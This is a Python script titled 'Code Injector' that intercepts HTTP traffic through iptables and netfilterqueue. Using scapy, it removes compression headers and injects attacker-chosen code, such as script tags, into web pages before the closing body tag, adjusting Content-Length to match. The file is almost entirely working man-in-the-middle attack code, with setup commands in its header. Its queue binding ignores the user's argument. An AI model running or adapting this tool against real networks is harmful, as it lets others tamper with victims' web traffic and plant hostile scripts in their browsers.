#!/usr/bin/env python
# coding=utf-8
"""
Title:    Code Injector
Author:   Aniket Ambore
Date:     June 30, 2021
Comment:  Code Injector - Inject code in website!

scapy Docs => https://scapy.readthedocs.io/en/latest/introduction.html
Through scapy module we can create different network tools like ARP Spoofer, Network Scanner, packet dumpers etc. This module can be used to create more advanced tools related to network security and ethical hacking.
netfilterqueue Docs => https://pypi.org/project/NetfilterQueue/
argparse Docs => https://docs.python.org/3/library/argparse.html#module-argparse

Before Running :-
sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
sudo iptables -I INPUT -j NFQUEUE --queue-num 0
"""

import netfilterqueue
import scapy.all as scapy
import re
import argparse
import os
import sys
import time

FAIL = '\033[91m'
OKGREEN = '\033[92m'
OKCYAN = '\033[96m'
ORANGE = '\033[93m'
PURPLE = '\033[95m'


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-if", "--injectcode", dest="inject_code",
                        help="Enter the path of our file, which contains the injection code.")
    parser.add_argument("-qm", "--queuenum", dest="queue_num", help="Queue Num that, you set with the help of iptables")
    options = parser.parse_args()
    if not options.inject_code:
        parser.error(
            FAIL + "[-] Please specify the file path, which contains the injection code, use --help for more info.")
    elif not options.queue_num:
        parser.error(
            FAIL + "[-] Please specify Queue Num that, you set with the help of iptables, use --help for more info.")
    return options


def read_file(inject_code_file):
    if os.path.exists(inject_code_file):
        print(OKCYAN + "[+] " + OKGREEN + "File Exists")
        with open(inject_code_file, "r") as f:
            return f.read()
    else:
        print(FAIL + "[-] File Doesn't Exists")
        return ""


def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print(OKCYAN + "[+] " + OKGREEN + "HTTP Request")
            # Modifying Load :- Accept-Encoding: gzip,deflate
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)



        elif scapy_packet[scapy.TCP].sport == 80:
            print(OKCYAN + "[+] " + OKGREEN + "HTTP Response")
            # Injecting the code smartly
            # injection_code = "<script>alert('Hello World !')</script>"
            load = load.replace("</body>", injection_code + "</body>")
            # Modifying Content-Length of load.
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                # print(content_length_search.group(0))
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0. / 100)


def script_header():
    slowprint('''\033[1;31m \033[95m
╦┌┐┌ ┬┌─┐┌─┐┌┬┐  ╔═╗┌─┐┌┬┐┌─┐
║│││ │├┤ │   │   ║  │ │ ││├┤
╩┘└┘└┘└─┘└─┘ ┴   ╚═╝└─┘─┴┘└─┘
    ''')


options = get_arguments()
script_header()
file_path = options.inject_code
queue_num = options.queue_num

injection_code = read_file(file_path)
print("\n" + OKCYAN + "💉💉💉 Injection Code - " + ORANGE + injection_code + " 💉💉💉 \n")

nfqueue = netfilterqueue.NetfilterQueue()
nfqueue.bind(1, process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print(FAIL + "[!] Caught KeyboardInterrupt Exception...")
